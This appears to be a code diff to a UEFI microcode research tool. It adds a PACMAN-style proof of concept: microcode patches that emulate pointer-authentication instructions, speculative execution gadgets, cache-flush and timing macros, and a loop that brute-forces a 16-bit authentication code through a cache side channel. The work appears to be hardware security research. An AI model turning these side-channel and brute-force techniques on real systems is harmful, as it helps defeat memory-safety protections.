@@ -351,7 +351,10 @@ usage(void)
 #define lfence() asm volatile("lfence\n")
 #define lmfence() asm volatile("lfence\n mfence\n")
 #define wbinvd() asm volatile("wbinvd\n")
-#define padding_cpuid() asm volatile("xor %%rax, %%rax\n xor %%rcx, %%rcx\n cpuid\n":::"cc", "rax", "rbx", "rcx", "rdx")
+#define barrier() asm volatile("xor %%rax, %%rax\n xor %%rcx, %%rcx\n cpuid\n":::"cc", "rax", "rbx", "rcx", "rdx")
+
+uint64_t ctx = 0xdeadbeef;
+uint64_t dummy;
 
 static void activate_udebug_insts(void) {
     wrmsr(0x1e6uL, 0x200uL);
@@ -1199,6 +1202,39 @@ static void test_CTDIV(void) {
     Print(L"[done]\n");
 }
 
+#define pac_sign(ptr, ctx) ({ \
+    uint64_t pac_ptr; \
+    asm volatile(".byte 0xf1\n": "=a"(pac_ptr): "a"(ptr), "c"(ctx));\
+    pac_ptr; })
+
+#define pac_auth(pac_ptr, ctx) ({ \
+    uint64_t ptr; \
+    asm volatile(".byte 0xcc\n": "=a"(ptr) : "a"(pac_ptr), "c"(ctx));\
+    ptr; })
+
+#define fix_branch_history() {for(int __i = 0; __i < 128; __i++){asm volatile("nop");}}
+#define clflush(p) { asm volatile("clflush 0(%0)\n" : : "c"(p)); }
+
+#define time_access(ptr)({\
+    register uint32_t delta;\
+    asm volatile(\
+      "mov %%rax, %%r10\n"\
+      "mfence\n"\
+      "rdtscp\n"\
+      "mov %%rax, %%r11\n"\
+      "mov (%%rbx), %%rcx\n"\
+      "lfence\n"\
+      "rdtscp\n"\
+      "sub %%rax, %%r11\n"\
+      "mov %%r10, %%rax\n"\
+      "neg %%r11\n"\
+      "mov %%r11, %%rcx"\
+      : "=c" (delta)\
+      : "b" (ptr)\
+      : "rdx", "r11", "r10"\
+    );\
+    delta;})
+
 static void test_PAC(void) {
     Print(L"[PAC]\n");
     init_match_and_patch();
@@ -1253,6 +1289,108 @@ static void test_PAC(void) {
     init_match_and_patch();
 }
 
+uint64_t __attribute__((aligned (0x200))) cond = 0;
+uint64_t* __attribute__((aligned (0x200))) cond1 = &cond;
+uint64_t** __attribute__((aligned (0x200))) cond2 = &cond1;
+uint64_t*** __attribute__((aligned (0x200))) cond3 = &cond2;
+uint64_t**** __attribute__((aligned (0x200))) cond4 = &cond3;
+uint64_t __attribute__((aligned (0x200))) obj1 = 0x112233;
+uint64_t __attribute__((aligned (0x200))) obj2 = 0x223355;
+
+// This gadget does not seem to work, probably due to the limited ROB size on GLM
+// which is 56 entries, and the pac_auth microcode has ~50 uops
+// This works if we use the `_weak` versions of pac_sign/auth with reduced uops (~25)
+static __attribute__ ((noinline)) uint64_t pacman_gadget1(uint64_t* pac_ptr) {
+    // pointer chasing for big speculation window
+    if (****cond4) {
+        uint64_t* ptr = (uint64_t*) pac_auth(pac_ptr, 0xdeadbeef);
+        return *ptr++;
+    }
+    return 0;
+}
+
+// Simpler pacman gadget where the auth operation is not in the speculative path,
+// only the access
+static __attribute__ ((noinline)) uint64_t pacman_gadget2(uint64_t* pac_ptr) {
+    uint64_t* ptr = (uint64_t*) pac_auth(pac_ptr, 0xdeadbeef);
+    if (cond) {
+        return *ptr;
+    }
+    return 0;
+}
+
+static void test_PACMAN(void) {
+    Print(L"[PACMAN]\n");
+    init_match_and_patch();
+    {
+        #include "ucode_patches/pac_sign.h"
+        // Print(L"patching addr: %08lx - ram: %08lx\n", addr, ucode_addr_to_patch_addr(addr));
+        patch_ucode(addr, ucode_patch, sizeof(ucode_patch) / sizeof(ucode_patch[0]));
+        // Print(L"hooking entry: %02lx, addr: %04lx, hook_addr: %04lx\n", hook_entry, addr, hook_address);
+        hook_match_and_patch(hook_entry, hook_address, addr);
+    }
+    {
+        #include "ucode_patches/pac_verify.h"
+        // Print(L"patching addr: %08lx - ram: %08lx\n", addr, ucode_addr_to_patch_addr(addr));
+        patch_ucode(addr, ucode_patch, sizeof(ucode_patch) / sizeof(ucode_patch[0]));
+        // Print(L"hooking entry: %02lx, addr: %04lx, hook_addr: %04lx\n", hook_entry, addr, hook_address);
+        hook_match_and_patch(hook_entry, hook_address, addr);
+    }
+
+    uint64_t known_ptr = (uint64_t)  &obj1;
+    uint64_t target_ptr = (uint64_t) &obj2;
+    uint64_t* known_pac_ptr = (uint64_t*) pac_sign(known_ptr, ctx);
+    uint64_t target_pac_ptr = pac_sign(target_ptr, ctx);
+    uint64_t target_pac = target_pac_ptr >> 48;;
+    uint64_t min_time = 10000000;
+    uint64_t best_value = 0;
+    Print(L"known PAC ptr: 0x%lx\n", known_pac_ptr);
+    Print(L"target ptr: 0x%lx\n", target_ptr);
+    Print(L"correct target PAC ptr: 0x%lx\n", target_pac_ptr);
+
+    obj2 += 1;
+    Print(L"access: %ld\n", time_access(&obj2));
+    clflush(&obj2);
+    Print(L"flush: %ld\n", time_access(&obj2));
+
+    // bruteforce PAC
+    Print(L"[+] bruteforcing...\n");
+    for (uint64_t pac_value = 0; pac_value <= 0xffff; pac_value++) {
+        uint64_t* pac_test = (uint64_t*)(target_ptr | (pac_value << 48));
+        for (int i = 0; i < 100; i++) {
+            barrier();
+            // gadget training phase
+            cond = 1;
+            for (int j = 0; j < 10; j++) {
+                fix_branch_history();
+                dummy += pacman_gadget2(known_pac_ptr);
+            }
+
+            // test
+            cond = 0;
+            clflush(&cond);
+            clflush(&obj2);
+            fix_branch_history();
+            barrier();
+            dummy += pacman_gadget2(pac_test);
+            barrier();
+
+            // test if speculatively hit obj2
+            uint64_t time = time_access(&obj2);
+            if (time < min_time) {
+                best_value = (uint64_t) pac_test;
+                min_time = time;
+            }
+        }
+    }
+
+    Print(L"best PAC guess: 0x%lx (access time: %ld)\n", best_value, min_time);
+    Print(L"auth best guess: 0x%lx\n", pac_auth(best_value, ctx));
+
+
+    init_match_and_patch();
+}
+
 EFI_STATUS
 EFIAPI
 efi_main (EFI_HANDLE image, EFI_SYSTEM_TABLE *SystemTable)
@@ -1291,7 +1429,7 @@ efi_main (EFI_HANDLE image, EFI_SYSTEM_TABLE *SystemTable)
 
     if (argc < 2) {
         // usage();
-        test_PAC();
+        test_PACMAN();
         return EFI_SUCCESS;
     } else if (argc > 1) {
         if (argv[1][0] == L'c') {
